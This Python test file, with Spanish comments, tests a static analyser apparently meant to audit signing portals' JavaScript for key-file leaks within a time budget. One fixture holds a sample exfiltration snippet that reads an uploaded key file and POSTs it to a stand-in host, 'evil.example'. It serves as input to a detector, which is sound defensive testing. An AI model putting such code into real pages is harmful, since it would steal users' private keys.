"""El analisis estatico dentro de un presupuesto de tiempo.

En el primer piloto del panel sobre un portal real, la ultima etapa parecia
congelada: el analisis de todos los bundles del sitio tardaba muchos minutos,
y el panel dejaba de esperar a los cinco. Estas pruebas fijan que el analisis
termina a tiempo, que gasta el tiempo primero en lo que importa para la clave,
y que lo que no llego a analizar se declara como tal: nunca como "analizado
sin rutas".
"""

from __future__ import annotations

import time

import pytest

from firmascope.audit_core.conclusions import Status
from firmascope.rule_engine.context import AuditContext
from firmascope.rule_engine.engine import RuleEngine
from firmascope.static_analyzer import analyze_scripts, analyze_source
from firmascope.static_analyzer.taint import AnalysisTimeout, ScriptAnalysis

#: La exfiltracion canonica: archivo -> FileReader -> fetch a un tercero.
EXFILTRA = (b"document.getElementById('key').addEventListener('change', e => {"
            b" const r = new FileReader(); r.onload = () => fetch('https://evil.example/c',"
            b" {method: 'POST', body: r.result}); r.readAsArrayBuffer(e.target.files[0]); });")


def bundle_grande(funciones: int = 4000) -> bytes:
    """Muchas funciones encadenadas: el tipo de bundle que se llevaba minutos."""
    partes = [f"function f{i}(a,b){{let c=a+b;return f{i + 1}(c,a)}}" for i in range(funciones)]
    partes.append(f"function f{funciones}(a){{return a}}")
    return ";".join(partes).encode()


def test_un_script_que_no_cabe_se_abandona_en_lugar_de_bloquear():
    with pytest.raises(AnalysisTimeout):
        ScriptAnalysis(bundle_grande(200), "x.js", deadline=time.monotonic() - 1).run()


def test_quedarse_sin_tiempo_no_degrada_a_un_analisis_por_patrones():
    """El barrido por patrones haria pasar la falta de analisis por un analisis."""
    with pytest.raises(AnalysisTimeout):
        analyze_source(EXFILTRA, "x.js", deadline=time.monotonic() - 1)


def test_la_sesion_termina_a_tiempo_y_declara_lo_que_no_analizo():
    scripts = [{"url": f"https://cdn.example/b{i}.js", "sha256": f"{i:064d}"} for i in range(4)]
    inicio = time.monotonic()
    report = analyze_scripts(scripts, lambda s: bundle_grande(), budget=0.5, script_budget=0.5)
    assert time.monotonic() - inicio < 20, "el presupuesto no acoto el analisis"
    assert report.timed_out, "lo que no se analizo no quedo declarado"
    assert report.parsed + len(report.timed_out) == 4
    assert report.to_dict()["scripts_timed_out"]


def test_el_tiempo_se_gasta_primero_en_lo_que_toca_la_clave():
    """Con tiempo para un solo script, se analiza el que lee archivos."""
    scripts = [
        {"url": "https://analitica.example/a.js", "sha256": "a" * 64, "third_party": True},
        {"url": "https://portal.example/firma.js", "sha256": "b" * 64},
    ]
    bodies = {"a" * 64: b"var x = 1; " * 50, "b" * 64: EXFILTRA}
    reloj = iter([0.0, 0.0] + [100.0] * 10)
    report = analyze_scripts(scripts, lambda s: bodies[s["sha256"]], budget=1.0,
                             clock=lambda: next(reloj))
    assert report.parsed == 1
    assert [s["sha256"] for s in report.timed_out] == ["a" * 64]
    assert report.paths, "el script de firma no se analizo"


# ----------------------------------------------------------------------
# Lo que dice FS-CODE-001 cuando falta cobertura
# ----------------------------------------------------------------------

def _veredicto(config, report):
    findings = {f.rule_id: f for f in RuleEngine().evaluate(
        AuditContext(config=config, events=[], static=report))}
    return findings["FS-CODE-001"]


def test_sin_analizar_lo_que_toca_la_clave_no_se_concluye_nada(config):
    """Justo esos scripts son los que podrian contener la ruta."""
    scripts = [{"url": "https://portal.example/limpio.js", "sha256": "c" * 64},
               {"url": "https://portal.example/firma.js", "sha256": "b" * 64}]
    bodies = {"c" * 64: b"var x = 1;", "b" * 64: EXFILTRA}
    reloj = iter([0.0] + [100.0] * 10)
    report = analyze_scripts(scripts, lambda s: bodies[s["sha256"]], budget=1.0,
                             clock=lambda: next(reloj))
    assert report.parsed == 0
    hallazgo = _veredicto(config, report)
    assert hallazgo.status is Status.INCONCLUSIVE
    assert "tiempo" in hallazgo.detail


def test_lo_no_analizado_que_no_toca_la_clave_se_menciona(config):
    scripts = [{"url": "https://portal.example/firma.js", "sha256": "d" * 64},
               {"url": "https://analitica.example/a.js", "sha256": "a" * 64,
                "third_party": True}]
    bodies = {"d" * 64: b"async function f(k,d){ await fetch('/r', {body: d}); }",
              "a" * 64: b"var x = 1; " * 50}
    reloj = iter([0.0, 0.0] + [100.0] * 10)
    report = analyze_scripts(scripts, lambda s: bodies[s["sha256"]], budget=1.0,
                             clock=lambda: next(reloj))
    hallazgo = _veredicto(config, report)
    assert hallazgo.status is Status.NOT_OBSERVED
    assert "Cobertura incompleta" in hallazgo.detail
    assert "analitica.example/a.js" in hallazgo.detail
